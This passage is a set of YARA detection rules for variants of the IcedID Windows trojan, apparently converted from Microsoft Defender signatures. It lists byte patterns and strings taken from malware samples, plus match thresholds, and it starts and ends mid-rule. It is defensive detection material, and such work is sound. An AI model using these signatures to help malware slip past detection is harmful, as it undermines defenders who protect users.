        detection_name = "Trojan:Win64/IcedID.BM!MTB"
        threat_id = "2147823094"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "BPmzDBLqBv" ascii //weight: 1
        $x_1_2 = "BysAb9gROH" ascii //weight: 1
        $x_1_3 = "IBplv6" ascii //weight: 1
        $x_1_4 = "PluginInit" ascii //weight: 1
        $x_1_5 = "Q6yYQEvh" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BM_2147823094_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BM!MTB"
        threat_id = "2147823094"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {e6 19 48 f7 f2 48 c1 ef 3d 48 81 e3 b6 1b 00 00 e4 b0 49 81 e8 c7 0a 00 00 4c 0b c0 48 81 dc 8b 21 00 00 48 81 ea ca 17 00 00 48 ff cd e4 de e6 ff 49 81 cf 98 22 00 00 48 f7 f8 41 59}  //weight: 3, accuracy: High
        $x_1_2 = "IFPGpxXa" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BM_2147823094_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BM!MTB"
        threat_id = "2147823094"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b f8 eb 2c 48 8d 8c 24 ?? ?? ?? ?? ff 54 24 ?? eb 14 48 8d 84 24 ?? ?? ?? ?? 48 8b f8 eb 20 83 c1 14 f3 a4 eb 31 48 81 c4 ?? ?? ?? ?? 5f eb}  //weight: 1, accuracy: Low
        $x_1_2 = "yguasdhuasydgtavsydyasdakja" ascii //weight: 1
        $x_1_3 = "rqdakc.dll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BN_2147823095_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BN!MTB"
        threat_id = "2147823095"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {48 83 ec 28 44 8b 4c 24 48 66 3b db 74 00 4c 8b 44 24 40 48 8b 54 24 38 3a c0 74 d4 33 c0 48 83 c4 28 eb db 4c 87 db 48 f7 d5}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MX_2147823271_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MX!MTB"
        threat_id = "2147823271"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {41 f7 ec c1 fa ?? 8b c2 c1 e8 ?? 03 c2 48 98 48 8d 0c 40 49 63 c4 41 83 c4 01 48 8d 14 c8 48 8b 44 24 28 42 0f b6 8c 32 f0 a1 06 00 41 32 4c 00 ff 43 88 4c 18 ff 44 3b 64 24 20 72}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MX_2147823271_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MX!MTB"
        threat_id = "2147823271"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "RunObject" ascii //weight: 10
        $x_1_2 = "Dt5re.dll" ascii //weight: 1
        $x_1_3 = "MQjPdsWW" ascii //weight: 1
        $x_1_4 = "Pds15V8RnD" ascii //weight: 1
        $x_1_5 = "UnCX5b6Q" ascii //weight: 1
        $x_1_6 = "XN0nLn6" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MX_2147823271_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MX!MTB"
        threat_id = "2147823271"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {48 8b 44 24 30 48 83 c4 28 eb ?? 89 44 24 40 83 3c 24 00 7e ?? eb ?? 8b 44 24 40 89 04 24 eb ?? 48 8b 44 24 38 48 89 44 24 10 eb ?? 8a 09 88 08 eb}  //weight: 10, accuracy: Low
        $x_5_2 = "Tjdbhasbs" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MY_2147823605_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MY!MTB"
        threat_id = "2147823605"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {41 f7 eb 89 c8 c1 f8 ?? c1 fa ?? 29 c2 89 c8 44 8d 04 d2 45 01 c0 44 29 c0 4c 63 c0 46 0f b6 04 06 45 32 04 09 45 88 04 0a 44 8d 41 01 48 83 c1 01 44 39 44 24 2c 77}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MY_2147823605_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MY!MTB"
        threat_id = "2147823605"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {8a 09 88 08 eb ?? 48 8b 44 24 08 48 8b 4c 24 10 eb ?? 48 8b 44 24 30 48 89 44 24 08 eb ?? 8b 44 24 40 ff c8 eb ?? 48 ff c0 48 89 44 24 10 eb}  //weight: 10, accuracy: Low
        $x_5_2 = "Gbhajasdas" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MY_2147823605_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MY!MTB"
        threat_id = "2147823605"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 8b 55 54 4c 8b f0 48 8b c5 48 85 d2 74 ?? 4d 8b c6 4c 2b c5 0f 1f 84 00 00 00 00 00 0f b6 08 41 88 0c 00 48 8d 40 01 48 83 ea 01 75}  //weight: 1, accuracy: Low
        $x_1_2 = "RegOpenKeyTransactedW" ascii //weight: 1
        $x_1_3 = "LockResource" ascii //weight: 1
        $x_1_4 = "FindFirstFileW" ascii //weight: 1
        $x_1_5 = "IsProcessorFeaturePresent" ascii //weight: 1
        $x_1_6 = "PostMessageW" ascii //weight: 1
        $x_1_7 = "GetKeyState" ascii //weight: 1
        $x_1_8 = "UnhookWindowsHookEx" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MZ_2147823632_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MZ!MTB"
        threat_id = "2147823632"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {8a 09 88 08 eb 18 48 ff c0 48 89 44 24 10 eb 5b eb 6e 48 8b 44 24 08 48 8b 4c 24 10 eb e2 48 8b 44 24 08 48 ff c0 eb}  //weight: 10, accuracy: High
        $x_5_2 = "Njasdkasjd" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MZ_2147823632_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MZ!MTB"
        threat_id = "2147823632"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "RunObject" ascii //weight: 10
        $x_1_2 = "b8Jz3.dll" ascii //weight: 1
        $x_1_3 = "BSQXLbda" ascii //weight: 1
        $x_1_4 = "Gr24GafOB" ascii //weight: 1
        $x_1_5 = "PlKVxcX5" ascii //weight: 1
        $x_1_6 = "VcBnn4k9" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MZ_2147823632_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MZ!MTB"
        threat_id = "2147823632"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "17"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "BTTamHo.dll" ascii //weight: 10
        $x_1_2 = "hqlite3_aggregate_context" ascii //weight: 1
        $x_1_3 = "hqlite3_aggregate_count" ascii //weight: 1
        $x_1_4 = "hqlite3_auto_extension" ascii //weight: 1
        $x_1_5 = "hqlite3_backup_finish" ascii //weight: 1
        $x_1_6 = "hqlite3_backup_init" ascii //weight: 1
        $x_1_7 = "GetDiskFreeSpaceW" ascii //weight: 1
        $x_1_8 = "LockFile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAA_2147823769_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAA!MTB"
        threat_id = "2147823769"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Rb7fv.dll" ascii //weight: 1
        $x_1_2 = "Jhsadjqk" ascii //weight: 1
        $x_1_3 = "BAnSTxJw" ascii //weight: 1
        $x_1_4 = "Dz0S7Kp7r" ascii //weight: 1
        $x_1_5 = "OXir60WB0AN" ascii //weight: 1
        $x_1_6 = "zsHtAN7ll" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win64_IcedID_BR_2147823954_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BR!MTB"
        threat_id = "2147823954"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "B6bBoHaPjgZ" ascii //weight: 1
        $x_1_2 = "JPwFQXG" ascii //weight: 1
        $x_1_3 = "M6tpCK44ScM" ascii //weight: 1
        $x_1_4 = "RunObject" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAB_2147823977_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAB!MTB"
        threat_id = "2147823977"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tZtsJ.dll" ascii //weight: 1
        $x_1_2 = "GYusdknsa" ascii //weight: 1
        $x_1_3 = "HEgB0tSO" ascii //weight: 1
        $x_1_4 = "HgHeC77mz" ascii //weight: 1
        $x_1_5 = "ulu7bLEKYG" ascii //weight: 1
        $x_1_6 = "rk2xZCtpn" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAC_2147824000_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAC!MTB"
        threat_id = "2147824000"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "e11pw.dll" ascii //weight: 1
        $x_1_2 = "sabhjasjak" ascii //weight: 1
        $x_1_3 = "DKpnWy2u" ascii //weight: 1
        $x_1_4 = "RKxKTRp1sc3" ascii //weight: 1
        $x_1_5 = "V9LSWl7wpQ" ascii //weight: 1
        $x_1_6 = "n6eIcmhIS" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAD_2147824001_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAD!MTB"
        threat_id = "2147824001"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ovw5Q.dll" ascii //weight: 1
        $x_1_2 = "Jhsadjqk" ascii //weight: 1
        $x_1_3 = "Hie88q3Wv" ascii //weight: 1
        $x_1_4 = "mJg8RcL1" ascii //weight: 1
        $x_1_5 = "u87wdPuFWc" ascii //weight: 1
        $x_1_6 = "xlxCYDeut5u" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAE_2147824056_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAE!MTB"
        threat_id = "2147824056"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vT99cJN0z" ascii //weight: 1
        $x_1_2 = "Hyuasbbjhas" ascii //weight: 1
        $x_1_3 = "AscHzBsxuiG" ascii //weight: 1
        $x_1_4 = "DJhDASkD4U" ascii //weight: 1
        $x_1_5 = "E5LMmAdfn6" ascii //weight: 1
        $x_1_6 = "JGIDh66FZko" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAF_2147824197_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAF!MTB"
        threat_id = "2147824197"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "t8RbR.dll" ascii //weight: 1
        $x_1_2 = "Hyuasbbjhas" ascii //weight: 1
        $x_1_3 = "AR2mgwpu" ascii //weight: 1
        $x_1_4 = "RuCMhkVyyvW" ascii //weight: 1
        $x_1_5 = "eQkMyof1vtl" ascii //weight: 1
        $x_1_6 = "n7iOlizF" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAG_2147824226_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAG!MTB"
        threat_id = "2147824226"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HXNaKkR" ascii //weight: 1
        $x_1_2 = "MtFUiF9TqfO" ascii //weight: 1
        $x_1_3 = "OnmGCbz" ascii //weight: 1
        $x_1_4 = "Ww7JMdCZlS" ascii //weight: 1
        $x_1_5 = "hKgJMU3aF0c" ascii //weight: 1
        $x_1_6 = "GYusdknsa" ascii //weight: 1
        $x_1_7 = "Q1e6lUwE" ascii //weight: 1
        $x_1_8 = "cibObHEm" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAH_2147824258_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAH!MTB"
        threat_id = "2147824258"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "D26oEn" ascii //weight: 1
        $x_1_2 = "GNesVkOIdR" ascii //weight: 1
        $x_1_3 = "GdWI9i4" ascii //weight: 1
        $x_1_4 = "Hyuasbbjhas" ascii //weight: 1
        $x_1_5 = "IA9iFMl" ascii //weight: 1
        $x_1_6 = "IIS9VMFFUh" ascii //weight: 1
        $x_1_7 = "Ilf9dl2C" ascii //weight: 1
        $x_1_8 = "NL4Dt8Iya" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAI_2147824367_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAI!MTB"
        threat_id = "2147824367"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "RunObject" ascii //weight: 1
        $x_1_2 = "Sf10SG72Lf" ascii //weight: 1
        $x_1_3 = "bNk2Mayh8" ascii //weight: 1
        $x_1_4 = "rMw6cjv" ascii //weight: 1
        $x_1_5 = "wy8sqv8iw" ascii //weight: 1
        $x_1_6 = "Gkhkgb" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAJ_2147824368_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAJ!MTB"
        threat_id = "2147824368"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Bjhasyuijkas" ascii //weight: 1
        $x_1_2 = "ByAsdQ" ascii //weight: 1
        $x_1_3 = "FeXSUTqD" ascii //weight: 1
        $x_1_4 = "I5VWaVj2g" ascii //weight: 1
        $x_1_5 = "NH5nLC" ascii //weight: 1
        $x_1_6 = "PCtkGbQB9" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAK_2147824416_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAK!MTB"
        threat_id = "2147824416"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Bjhasyuijkas" ascii //weight: 1
        $x_1_2 = "QIUxym" ascii //weight: 1
        $x_1_3 = "ZJNoJhH6" ascii //weight: 1
        $x_1_4 = "gN378mXVUY" ascii //weight: 1
        $x_1_5 = "sh33cHxJA5s" ascii //weight: 1
        $x_1_6 = "uwnScbuxSOI" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_NA_2147824700_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.NA!MTB"
        threat_id = "2147824700"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "7HiXA.dll" ascii //weight: 1
        $x_1_2 = "CCE9UDzTb" ascii //weight: 1
        $x_1_3 = "YFIwDjuQLOL" ascii //weight: 1
        $x_1_4 = "af72Hr" ascii //weight: 1
        $x_1_5 = "hasdnuhas" ascii //weight: 1
        $x_1_6 = "mcfNinLtj" ascii //weight: 1
        $x_1_7 = "rsl77X2C6s3" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = {4d 3b d1 72 0e 8b c6 25 43 4a 00 00 48 31 83 28 01 00 00 83 c1 03 48 63 c1 48 3b c2 75 e2}  //weight: 5, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ScriptString_pLogAttr" ascii //weight: 1
        $x_1_2 = "ijniuashdyguas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Bjhasyuijkas" ascii //weight: 1
        $x_1_2 = "Bnmr84Qey" ascii //weight: 1
        $x_1_3 = "CSENVxJ" ascii //weight: 1
        $x_1_4 = "EhsTeD0s2l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "X5jhh4Wq" ascii //weight: 1
        $x_1_2 = "ef5qTq" ascii //weight: 1
        $x_1_3 = "hasdnuhas" ascii //weight: 1
        $x_1_4 = "oYVETr" ascii //weight: 1
        $x_1_5 = "rfoEqHCN" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_4
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "IO4DT6jHTU" ascii //weight: 1
        $x_1_2 = "No6ML9jOI" ascii //weight: 1
        $x_1_3 = "RXVl06Xqs" ascii //weight: 1
        $x_1_4 = "fP3W65ry" ascii //weight: 1
        $x_1_5 = "hasdnuhas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_5
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "UIvakLxa7" ascii //weight: 1
        $x_1_2 = "UYtbkAjw" ascii //weight: 1
        $x_1_3 = "UcStyhS" ascii //weight: 1
        $x_1_4 = "agjhsahjasksd" ascii //weight: 1
        $x_1_5 = "hQ6J8miIF" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_6
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {80 44 24 38 4f c6 44 24 39 16 e9 44 01 00 00 80 44 24 30 60 c6 44 24 31 39 66 3b d2 74 3b 80 44 24 34 3c c6 44 24 35 12 3a e4 74 56}  //weight: 2, accuracy: High
        $x_1_2 = "iuasduyuagsdjasass" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_7
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_6_1 = {66 3b ed 74 1d b8 6c 00 00 00 66 89 44 24 64 66 3b d2 74 dc 48 89 54 24 10 48 89 4c 24 08 3a ff 74 dc 48 81 ec f8 00 00 00 48 c7 44 24 50 00 00 00 00 3a d2 74 1c b8 6c 00 00 00 66 89 44 24 62 3a ed 74 c1}  //weight: 6, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_8
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {44 89 4c 24 20 4c 89 44 24 18 66 3b f6 74 d4 83 c0 62 66 89 44 24 34 3a e4 74 00 b8 54 00 00 00 83 c0 0f eb cc 48 83 ec 68}  //weight: 3, accuracy: High
        $x_2_2 = "fuadsyguasgduhaisudjyuagsdua" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EM_2147824901_9
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EM!MTB"
        threat_id = "2147824901"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
